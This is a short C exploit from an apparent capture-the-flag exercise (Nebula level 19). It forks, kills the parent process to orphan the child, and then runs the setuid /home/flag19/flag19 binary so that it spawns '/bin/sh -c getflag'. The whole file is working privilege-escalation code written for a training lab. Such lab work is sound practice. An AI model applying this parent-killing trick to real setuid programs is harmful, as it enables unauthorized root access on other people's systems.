// USEFUL LINK FOR EXPLAINING WHY IT IS /HOME/FLAG19/FLAG19 /BIN/SH INSTEAD OF /HOME/FLAG19/FLAG19 X2 AND THEN /BIN/SH
// https://stackoverflow.com/questions/12677120/execl-arguments-in-ubuntu
#include <stdio.h>
#include <signal.h>
#include <unistd.h>
#include <sys/types.h>
#include <stdlib.h>
int main() {
        if (fork() == 0) {
        // child process
                printf("Hello\n");
                int child = getppid();
                printf("%d\n", child);
		// what happens here is that the program at /home/flag19/flag19 replaces argc with 3 and argv[] with /bin/sh, -c, and getflag
                execl("/home/flag19/flag19",  "/bin/sh", "-c", "getflag>/tmp/test.txt", NULL);
        } else {
        // parent process
                int parent = getppid();
                printf("%d\n", parent);
                kill(parent, SIGTERM);
                printf("dead parent\n");
        }
}

